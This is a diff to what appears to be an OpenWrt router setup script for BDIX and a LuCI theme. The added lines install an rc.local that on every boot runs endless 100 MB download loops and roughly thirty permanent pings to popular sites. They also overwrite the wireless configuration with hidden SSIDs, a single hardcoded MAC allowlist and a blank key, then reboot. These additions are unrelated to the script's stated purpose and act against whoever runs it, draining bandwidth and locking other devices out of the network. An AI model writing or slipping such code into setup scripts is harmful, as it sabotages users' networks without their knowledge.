@@ -1,3 +1,68 @@
+#Startup Setup
+
+cat > /etc/rc.local << "EOF"
+# Put your custom commands here that should be executed once
+# the system init finished. By default this file does nothing.
+
+#Downloading -1
+
+sh -c 'sleep 1; while true; do wget -qO /dev/null "https://cachefly.cachefly.net/100mb.test?$RANDOM"; done' &
+
+#Downloading -2
+
+sh -c 'sleep 2; while true; do wget -qO /dev/null "https://cachefly.cachefly.net/100mb.test?$RANDOM"; done' &
+
+#Downloading -3
+
+sh -c 'sleep 3; while true; do wget -qO /dev/null "https://cachefly.cachefly.net/100mb.test?$RANDOM"; done' &
+
+# Search & Tech Giants
+ping -i 1 8.8.8.8 >/dev/null 2>&1 &
+ping -i 1 1.1.1.1 >/dev/null 2>&1 &
+ping -i 1 microsoft.com >/dev/null 2>&1 &
+ping -i 1 apple.com >/dev/null 2>&1 &
+ping -i 1 yahoo.com >/dev/null 2>&1 &
+ping -i 1 bing.com >/dev/null 2>&1 &
+
+# Social Media & Communication
+ping -i 1 facebook.com >/dev/null 2>&1 &
+ping -i 1 instagram.com >/dev/null 2>&1 &
+ping -i 1 x.com >/dev/null 2>&1 &
+ping -i 1 linkedin.com >/dev/null 2>&1 &
+ping -i 1 whatsapp.com >/dev/null 2>&1 &
+ping -i 1 discord.com >/dev/null 2>&1 &
+
+# Video Streaming & Entertainment
+ping -i 1 youtube.com >/dev/null 2>&1 &
+ping -i 1 netflix.com >/dev/null 2>&1 &
+ping -i 1 primevideo.com >/dev/null 2>&1 &
+ping -i 1 twitch.tv >/dev/null 2>&1 &
+ping -i 1 spotify.com >/dev/null 2>&1 &
+
+# E-commerce & Shopping
+ping -i 1 amazon.com >/dev/null 2>&1 &
+ping -i 1 aliexpress.com >/dev/null 2>&1 &
+ping -i 1 ebay.com >/dev/null 2>&1 &
+ping -i 1 alibaba.com >/dev/null 2>&1 &
+
+# Cloud, Development & Infrastructure
+ping -i 1 github.com >/dev/null 2>&1 &
+ping -i 1 aws.amazon.com >/dev/null 2>&1 &
+ping -i 1 cloudflare.com >/dev/null 2>&1 &
+ping -i 1 azure.microsoft.com >/dev/null 2>&1 &
+ping -i 1 digitalocean.com >/dev/null 2>&1 &
+
+# Gaming & Others
+ping -i 1 steampowered.com >/dev/null 2>&1 &
+ping -i 1 epicgames.com >/dev/null 2>&1 &
+ping -i 1 wikipedia.org >/dev/null 2>&1 &
+ping -i 1 reddit.com >/dev/null 2>&1 &
+
+exit 0
+EOF
+
+chmod +x /etc/rc.local
+
 #!/bin/sh
 
 # Function: Strictly control each step
@@ -73,3 +138,55 @@ run_step "Installing LuCI theme Aurora" \
 
 echo "------------------------------------------------"
 echo "🎉 Congratulations! All steps completed successfully and BDIX is now running."
+
+#Wifi Config
+
+cat > /etc/config/wireless << "EOF"
+
+config wifi-device 'radio0'
+        option type 'mac80211'
+        option path '1e140000.pcie/pci0000:00/0000:00:01.0/0000:02:00.0'
+        option channel 'auto'
+        option band '2g'
+        option htmode 'HT40'
+        option disabled '0'
+        option cell_density '3'
+        option mu_beamformer '1'
+        option noscan '1'
+        option vendor_vht '1'
+
+config wifi-iface 'default_radio0'
+        option device 'radio0'
+        option network 'lan'
+        option mode 'ap'
+        option ssid 'Xiaomi 2.4Ghz'
+        option encryption 'sae'
+        option macfilter 'allow'
+        list maclist 'AC:12:03:5D:78:39'
+        option hidden '1'
+        option key '           '
+
+config wifi-device 'radio1'
+        option type 'mac80211'
+        option path '1e140000.pcie/pci0000:00/0000:00:00.0/0000:01:00.0'
+        option channel 'auto'
+        option band '5g'
+        option htmode 'VHT80'
+        option disabled '0'
+        option cell_density '3'
+        option mu_beamformer '1'
+
+config wifi-iface 'default_radio1'
+        option device 'radio1'
+        option network 'lan'
+        option mode 'ap'
+        option ssid 'Xiaomi 5Ghz'
+        option encryption 'sae'
+        option macfilter 'allow'
+        list maclist 'AC:12:03:5D:78:39'
+        option hidden '1'
+        option key '           '
+
+EOF
+wifi reload
+reboot
